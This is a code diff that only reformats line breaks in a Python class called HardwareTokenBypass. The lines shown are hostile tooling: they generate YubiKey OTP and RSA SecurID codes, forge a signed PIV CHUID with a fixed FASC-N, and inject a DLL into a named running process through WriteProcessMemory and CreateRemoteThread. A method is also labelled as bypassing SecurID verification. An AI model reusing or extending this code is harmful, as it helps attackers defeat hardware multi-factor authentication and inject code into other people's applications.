@@ -149,9 +149,7 @@ class HardwareTokenBypass:
         # YubiKey serial format: 8-digit serial number
         return str(secrets.randbelow(90000000) + 10000000)
 
-    def _generate_yubikey_otp(
-        self, public_id: str, private_id: bytes, aes_key: bytes, counter: int, session: int
-    ) -> str:
+    def _generate_yubikey_otp(self, public_id: str, private_id: bytes, aes_key: bytes, counter: int, session: int) -> str:
         """Generate YubiKey OTP using Yubico OTP algorithm.
 
         Args:
@@ -249,9 +247,7 @@ class HardwareTokenBypass:
             },
         }
 
-    def generate_rsa_securid_token(
-        self, serial_number: str = None, seed: bytes = None
-    ) -> dict[str, Any]:
+    def generate_rsa_securid_token(self, serial_number: str = None, seed: bytes = None) -> dict[str, Any]:
         """Generate RSA SecurID token code.
 
         Args:
@@ -287,8 +283,7 @@ class HardwareTokenBypass:
             "serial_number": serial_number,
             "token_code": token_code,
             "next_token": next_token,
-            "time_remaining": self.securid_config["token_interval"]
-            - (current_time % self.securid_config["token_interval"]),
+            "time_remaining": self.securid_config["token_interval"] - (current_time % self.securid_config["token_interval"]),
             "timestamp": current_time,
             "interval": self.securid_config["token_interval"],
         }
@@ -438,9 +433,7 @@ class HardwareTokenBypass:
 
         # FASC-N (Federal Agency Smart Credential Number)
         chuid.extend(b"\x30\x19")  # Tag and length
-        chuid.extend(
-            b"\xd4\xe7\x39\xda\x73\x9c\xed\x39\xce\x73\x9d\x83\x68\x58\x21\x08\x42\x10\x84\x21\xc8\x42\x10\xc3\xeb"
-        )
+        chuid.extend(b"\xd4\xe7\x39\xda\x73\x9c\xed\x39\xce\x73\x9d\x83\x68\x58\x21\x08\x42\x10\x84\x21\xc8\x42\x10\xc3\xeb")
 
         # GUID
         chuid.extend(b"\x34\x10")  # Tag and length
@@ -461,9 +454,7 @@ class HardwareTokenBypass:
 
         # Generate or use cached issuer key for signing
         if not hasattr(self, "_issuer_key"):
-            self._issuer_key = rsa.generate_private_key(
-                public_exponent=65537, key_size=2048, backend=default_backend()
-            )
+            self._issuer_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
 
         # Sign the CHUID data with RSA-PSS signature
         signature = self._issuer_key.sign(
@@ -492,9 +483,7 @@ class HardwareTokenBypass:
         from cryptography.x509.oid import NameOID
 
         # Generate private key
-        private_key = rsa.generate_private_key(
-            public_exponent=65537, key_size=2048, backend=default_backend()
-        )
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
 
         # Generate certificate
         subject = issuer = x509.Name(
@@ -560,9 +549,7 @@ class HardwareTokenBypass:
 
             # Establish context
             h_context = ctypes.c_ulong()
-            result = self.winscard.SCardEstablishContext(
-                self.SCARD_SCOPE_SYSTEM, None, None, ctypes.byref(h_context)
-            )
+            result = self.winscard.SCardEstablishContext(self.SCARD_SCOPE_SYSTEM, None, None, ctypes.byref(h_context))
 
             if result == 0:  # SCARD_S_SUCCESS
                 # Store context for later use
@@ -630,11 +617,7 @@ class HardwareTokenBypass:
             import psutil
 
             target_pid = next(
-                (
-                    proc.info["pid"]
-                    for proc in psutil.process_iter(["pid", "name"])
-                    if application.lower() in proc.info["name"].lower()
-                ),
+                (proc.info["pid"] for proc in psutil.process_iter(["pid", "name"]) if application.lower() in proc.info["name"].lower()),
                 None,
             )
             if not target_pid:
@@ -659,18 +642,12 @@ class HardwareTokenBypass:
                 )
 
                 # Write DLL path
-                self.kernel32.WriteProcessMemory(
-                    process_handle, remote_memory, dll_path_bytes, len(dll_path_bytes), None
-                )
+                self.kernel32.WriteProcessMemory(process_handle, remote_memory, dll_path_bytes, len(dll_path_bytes), None)
 
                 # Get LoadLibraryA address
-                load_library = self.kernel32.GetProcAddress(
-                    self.kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA"
-                )
+                load_library = self.kernel32.GetProcAddress(self.kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
 
-                if thread_handle := self.kernel32.CreateRemoteThread(
-                    process_handle, None, 0, load_library, remote_memory, 0, None
-                ):
+                if thread_handle := self.kernel32.CreateRemoteThread(process_handle, None, 0, load_library, remote_memory, 0, None):
                     self.kernel32.CloseHandle(thread_handle)
                     self.kernel32.CloseHandle(process_handle)
 
@@ -778,15 +755,7 @@ class HardwareTokenBypass:
         code = bytearray(512)
         code[0] = 0xC3  # ret instruction
 
-        return (
-            bytes(dos_header)
-            + bytes([0] * (128 - len(dos_header)))
-            + pe_header
-            + coff
-            + bytes(optional)
-            + bytes(section)
-            + code
-        )
+        return bytes(dos_header) + bytes([0] * (128 - len(dos_header))) + pe_header + coff + bytes(optional) + bytes(section) + code
 
     def _bypass_securid_verification(self, application: str) -> dict[str, Any]:
         """Bypass RSA SecurID verification."""
